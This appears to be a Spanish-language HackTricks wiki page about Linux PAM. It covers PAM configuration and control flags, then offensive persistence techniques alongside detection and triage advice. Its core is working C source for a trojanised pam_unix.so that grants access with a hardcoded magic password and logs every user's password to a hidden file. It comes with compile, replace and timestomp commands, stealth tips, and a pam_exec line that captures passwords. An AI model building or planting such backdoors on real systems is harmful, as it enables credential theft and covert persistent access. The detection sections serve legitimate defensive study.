# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Información básica

**PAM (Pluggable Authentication Modules)** actúa como un mecanismo de seguridad que **verifica la identidad de los usuarios que intentan acceder a servicios informáticos** y controla su acceso según diversos criterios. Es como un guardián digital que garantiza que solo los usuarios autorizados puedan utilizar servicios específicos y que, al mismo tiempo, puede limitar su uso para evitar la sobrecarga del sistema.

#### Archivos de configuración

- **Solaris** admite el archivo central heredado `/etc/pam.conf`, pero las recomendaciones actuales prefieren los archivos de servicio ubicados en `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Los sistemas Linux** prefieren un enfoque basado en directorios, donde las configuraciones específicas de cada servicio se almacenan en `/etc/pam.d`. Por ejemplo, el archivo de configuración del servicio login se encuentra en `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un ejemplo de configuración de PAM para el servicio login podría ser el siguiente:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Ámbitos de gestión de PAM**

Estos ámbitos, o grupos de gestión, incluyen **auth**, **account**, **password** y **session**, cada uno responsable de distintos aspectos del proceso de autenticación y gestión de sesiones:<sup>[[1]](#references)</sup>

- **Auth**: Valida la identidad del usuario, a menudo solicitando una contraseña.
- **Account**: Gestiona la verificación de la cuenta y comprueba condiciones como la pertenencia a grupos o las restricciones horarias.
- **Password**: Gestiona las actualizaciones de contraseñas, incluidas las comprobaciones de complejidad y la prevención de ataques de diccionario.
- **Session**: Gestiona las acciones al iniciar o finalizar una sesión de servicio, como montar directorios o establecer límites de recursos.

#### **Controles de módulos PAM**

Los controles determinan la respuesta del módulo ante el éxito o el fallo, lo que influye en el proceso de autenticación general. Estos incluyen:<sup>[[1]](#references)</sup>

- **Required**: El fallo de un módulo requerido provoca un fallo final, pero solo después de comprobar todos los módulos siguientes.
- **Requisite**: Finalización inmediata del proceso si se produce un fallo.
- **Sufficient**: Si ningún módulo `required` anterior ha fallado, el éxito se devuelve de inmediato y se omiten los módulos restantes del mismo grupo de gestión.
- **Optional**: Solo provoca un fallo si es el único módulo de la pila.

#### Semántica ofensiva importante

Al analizar o modificar PAM, la **ubicación de una regla insertada** determina qué pila la aplica:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` y `substack` incorporan reglas de otros archivos, por lo que editar `sshd` podría afectar solo a SSH, mientras que editar `system-auth`, `common-auth` u otra pila compartida afecta a varios servicios a la vez.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM también admite controles entre corchetes, como `[success=1 default=ignore]`. Estos se pueden abusar para **omitir uno o más módulos** tras una comprobación personalizada exitosa, en lugar de reemplazar de forma visible `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` puede ser **absoluta** (`/usr/lib/security/pam_custom.so`) o **relativa** al directorio predeterminado de módulos PAM. En sistemas Linux modernos, los directorios reales suelen ser `/lib/security`, `/lib64/security`, `/usr/lib/security` o rutas multiarch como `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Consejo rápido para operadores: antes de aplicar cambios, identifica siempre el **grafo completo de servicios**. Por ejemplo, `sshd -> password-auth -> system-auth` en algunas distribuciones, o `sshd -> system-remote-login -> system-login -> system-auth` en otras, significa que el mismo implante de una línea puede afectar a muchos más servicios de lo previsto.<sup>[[1]](#references)[[13]](#references)</sup>

Un módulo `auth` personalizado puede añadir un desafío interactivo a `sudo` después de la contraseña de la cuenta. Antes de revisar manualmente el desafío, inspecciona la pila efectiva de `/etc/pam.d/sudo`, las políticas incluidas, los argumentos del módulo y los permisos de cualquier archivo de datos local mencionado. Una lista de palabras del desafío que se pueda leer no omite por sí sola la comprobación de la contraseña ni concede acceso mediante sudoers. Una transición privilegiada sigue requiriendo la autenticación correcta de la cuenta, completar todos los pasos PAM requeridos y una regla de sudo capaz de otorgar acceso root; la enumeración desatendida no debería activar el desafío.

Para la vulnerabilidad histórica de propiedad de `pam_motd` de Ubuntu ([`CVE-2010-0832`](https://ubuntu.com/security/cve-2010-0832)), revisa la compilación real de `libpam-modules` y si un servicio de inicio de sesión invoca el módulo de sesión afectado. Ubuntu la corrigió en **1.1.0-2ubuntu1.1** para 9.10 y **1.1.1-2ubuntu5** para 10.04 LTS; otras versiones o backports del proveedor requieren evaluar sus propios paquetes. Según lo informado, la ruta requería que quien invocaba el proceso reemplazara su `.cache` personal por un enlace simbólico y luego iniciara una sesión PAM, lo que hacía que el módulo antiguo cambiara la propiedad de un objetivo protegido. La presencia de una entrada `.cache`, una línea `pam_motd.so` o una versión antigua del kernel no demuestra por sí sola que el sistema esté expuesto; comprueba el control del directorio personal, la versión efectiva del módulo, la posibilidad de iniciar sesión, el tratamiento de enlaces simbólicos y los permisos del objetivo, sin reemplazar archivos ni iniciar una sesión durante la enumeración pasiva. Consulta el [aviso de seguridad de Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Ejemplo de escenario

En una configuración con varios módulos `auth`, el proceso sigue un orden estricto. Si el módulo `pam_securetty` detecta que el terminal de inicio de sesión no está autorizado, se bloquean los inicios de sesión de root, pero se siguen procesando todos los módulos debido a su estado "required". `pam_env` establece variables de entorno que pueden mejorar la experiencia del usuario. Los módulos `pam_ldap` y `pam_unix` trabajan en conjunto para autenticar al usuario; `pam_unix` intenta usar una contraseña proporcionada previamente, lo que mejora la eficiencia y la flexibilidad de los métodos de autenticación.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` en una pila de servicios

`pam_permit.so` devuelve éxito en las comprobaciones PAM. Si un usuario con pocos privilegios puede modificar la política PAM efectiva de un servicio, insertarlo con una bandera de control que interrumpa la pila de autenticación puede eliminar la comprobación de contraseña de ese servicio. En el caso de `sudo`, inspecciona `/etc/pam.d/sudo` y cualquier archivo `common-auth` o `system-auth` incluido antes de decidir qué servicios se ven afectados. Un bypass de autenticación PAM **no** concede una nueva regla de sudoers; el usuario aún debe estar autorizado para ejecutar el comando solicitado. Comprueba el orden de las reglas y cualquier fallo `required` anterior, en lugar de asumir que una única línea `sufficient pam_permit.so` siempre tendrá éxito.

## Backdooring PAM – Hooking `pam_unix.so`

Un truco clásico de persistencia en entornos Linux de alto valor es **reemplazar la biblioteca PAM legítima por una versión troyanizada que pueda sustituirla directamente**. En un host cuya pila PAM carga `pam_unix.so`, la autenticación por SSH o consola puede invocar su punto de entrada `pam_sm_authenticate()`; un reemplazo malicioso puede capturar credenciales o implementar un bypass con una contraseña *mágica*.<sup>[[2]](#references)[[11]](#references)</sup>

### Guía rápida de compilación
El esquema siguiente utiliza el punto de entrada de servicio `pam_sm_authenticate()` de Linux-PAM y `pam_get_authtok()` para acceder al token de autenticación.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Troyano de ejemplo `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compila y reemplaza sigilosamente (el patrón de reemplazo/timestomp está documentado por Unit 42). Ajusta tanto la ruta de copia de seguridad codificada en el wrapper como los comandos siguientes al directorio real de módulos PAM del objetivo:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Consejos de OpSec
1. **Sobrescritura atómica** – escribe una biblioteca completa en un archivo temporal y renómbralo para colocarlo en su ubicación definitiva, a fin de evitar dejar un módulo de autenticación escrito parcialmente.
2. Se observó una ruta como `/usr/bin/.dbus.log` en el análisis de AuthDoor de Unit 42, por lo que también es un indicador útil para la búsqueda de amenazas.<sup>[[2]](#references)</sup>
3. Conserva los puntos de entrada que espera la pila PAM (por ejemplo, `pam_sm_authenticate` y `pam_sm_setcred`) para que las demás operaciones de gestión sigan funcionando.<sup>[[11]](#references)[[18]](#references)</sup>

### Detección
Para comprobar la integridad de los paquetes, RPM verifica los metadatos de los archivos instalados, `debsums -s` informa de errores de suma de comprobación y `dpkg -S`, en el bloque de triage, consulta la propiedad de los paquetes; la sintaxis de audit watch registra las escrituras y los cambios de atributos de una ruta.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Compara el MD5/SHA256 de `pam_unix.so` con el del paquete de la distribución.
* Ejecuta `rpm -V pam` o `debsums -s libpam-modules` para detectar bibliotecas sustituidas sin calcular hashes manualmente.
* Busca permisos de escritura para todos o propietarios inusuales en `/lib/security/`.
* Regla de `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Busca módulos inesperados en las configuraciones de PAM: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Ese `grep` de `pam_` no detecta módulos personalizados con otros nombres base de `.so`. Revisa las líneas **activas** de `auth`, `account`, `password` y `session` en `/etc/pam.d` (y en `/etc/pam.conf`, cuando se use), incluidos su indicador de control y cualquier pila incluida. Un módulo desconocido ubicado como `auth sufficient` antes de la comprobación normal de contraseña justifica revisar la propiedad del paquete y el binario; [la sintaxis de control de PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) puede hacer que un resultado satisfactorio finalice esa parte de la pila antes de tiempo. El nombre de un módulo, una marca de tiempo inusual o la opción `nodelay`, por sí solos, no demuestran que haya un bypass. Si el comportamiento sugiere un timing leak, inspecciona primero la implementación y la accesibilidad del servicio; la enumeración rutinaria no debería enviar repetidamente intentos de autenticación.

### Comandos rápidos de triage (tras una intrusión o para la búsqueda de amenazas)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abusar de `pam_exec` para persistencia
En lugar de reemplazar `pam_unix.so`, una opción menos intrusiva es añadir una línea `pam_exec` en `/etc/pam.d/sshd` para que una invocación que alcance esa línea de PAM ejecute un helper, sin alterar el stack normal.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` recibe metadatos de PAM en variables de entorno como `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` y `PAM_TYPE`. Con `expose_authtok`, el helper puede leer hasta `PAM_MAX_RESP_SIZE` bytes de la contraseña desde `stdin` durante las fases `auth` o `password`. Si quieres que el helper se ejecute con el UID efectivo en lugar del UID real, añade `seteuid`.<sup>[[4]](#references)</sup>

A continuación, se incluyen notas prácticas sobre los tipos de módulo y el filtro `type=` documentados para `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` es mejor para **acciones posteriores al inicio de sesión**, como volver a abrir sockets o iniciar un daemon desacoplado.
- `auth optional pam_exec.so quiet expose_authtok ...` es la opción habitual para **capturar credenciales**, porque se ejecuta antes de que se abra la sesión.
- Se puede usar `type=session` o `type=auth` para limitar la ejecución a una fase PAM específica y evitar ejecuciones duplicadas innecesarias.

Para revisar privilegios, una ruta absoluta a un helper de `pam_exec.so` que el usuario actual pueda modificar es una opción a investigar incluso si el archivo tiene el atributo append-only (`a`): [el atributo permite añadir contenido](https://man7.org/linux/man-pages/man1/chattr.1.html), lo que podría bastar para alterar el comportamiento posterior de un script de shell. Primero confirma que el servicio y el evento de PAM realmente llegan a esa línea, que el helper y su ruta padre son de confianza, y que el comando se ejecuta con una identidad más privilegiada; [`seteuid` cambia qué UID de PAM se usa](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Un archivo modificable o el resultado de `lsattr` por sí solos no demuestran que se ejecute con privilegios.

### Sobrevivir a las herramientas de la distribución: `authselect`

En los sistemas de la familia RHEL y Fedora que usan `authselect`, las modificaciones directas a archivos generados como `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` pueden ser **sobrescritas por `authselect`**. Para mantener los cambios, los operadores suelen modificar el perfil personalizado activo en `/etc/authselect/custom/<profile>/` y luego volver a seleccionarlo.<sup>[[5]](#references)[[19]](#references)</sup>

Flujo de trabajo habitual si tienes root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Esto es importante tanto para el ataque como para el triaje: si `/etc/pam.d/system-auth` contiene el banner `Generated by authselect` y `Do not modify this file manually`, el punto de persistencia real puede estar en `/etc/authselect/custom/` en lugar de `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Técnicas recientes observadas en la práctica

Informes recientes de 2025 sobre el backdoor para Linux **Plague** mostraron la misma idea central llevada más lejos: un componente PAM malicioso con una **contraseña estática de bypass**, además de la limpieza de variables de entorno relacionadas con SSH y del historial del shell (`HISTFILE=/dev/null`) para reducir los rastros de la sesión después del inicio de sesión.<sup>[[3]](#references)</sup> Este es un patrón de búsqueda útil, ya que la lógica del backdoor puede estar en PAM, mientras que los rastros de sigilo solo aparecen **después** de que la autenticación se realiza correctamente.


## References

- [1] [pam.conf(5) / pam.d(5) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [El manual del operador encubierto: infiltración de redes globales de telecomunicaciones - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: un backdoor basado en PAM para Linux recién descubierto](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configuración de la autenticación de usuarios mediante authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Páginas del manual de Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Páginas del manual de Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Administración de la autenticación en Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guía de autenticación a nivel de sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista de archivos del paquete de Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Páginas del manual de Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Cambios/Convertir Authselect en obligatorio - Wiki del proyecto Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
